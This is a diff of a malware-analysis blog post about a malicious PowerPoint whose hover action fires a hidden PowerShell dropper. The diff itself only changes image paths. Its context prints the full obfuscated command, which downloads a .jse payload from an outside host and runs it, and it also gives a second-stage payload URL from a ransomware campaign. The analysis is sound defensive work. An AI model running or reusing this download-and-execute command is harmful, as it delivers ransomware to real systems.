@@ -15,14 +15,14 @@ This document used an onhoven action on a link inside the document to try and in
 
 ### Powershell command
 Initially, the first command used is the following powershell command which gets triggered upon hoverup on the hyperlink:  
-![powershell command](/posts/malicious_ppt_1/powershell_command.png)
+![powershell command](/posts/malicious_ppt1/powershell_command.png)
 The command is:
 ```ps
 powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http:'+[char] 0x2F+[char] 0x2F+'cccn.nl'+[char] 0x2F+'c.php',\"$env:temp\ii.jse\"); Invoke-Item \"$env:temp\ii.jse\""
 ```
 
 We can further deobfuscate this command using engines like [tio.run](https://tio.run/):  
-![tio.run](/posts/malicious_ppt_1/tioRun_powershell.png)  
+![tio.run](/posts/malicious_ppt1/tioRun_powershell.png)  
 
 So this command tries to:
 - download a file named "c.php" from h[x][x]p://cccn.nl/c.php
@@ -338,7 +338,7 @@ Viewing the IOC.json for this sample reveals the following insights about the dr
 ```
 Overall, it does some modifications on the .jse file (moving to a different location) and also tries to download a file from the url `https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20`. This will end up being the final executable that will be run. If we try to crack the value `e9e45de07d328e8d46adf4357840be5e` that is passed to the `add` parameter of the url, we will get back the word `pollos`:  
 
-![tio.run](/posts/malicious_ppt_1/cracked_hash.png)  
+![tio.run](/posts/malicious_ppt1/cracked_hash.png)  
 
 It refers to the actual campaing itself, which was named `Los Pollos Hermanos` ransomware.  
 
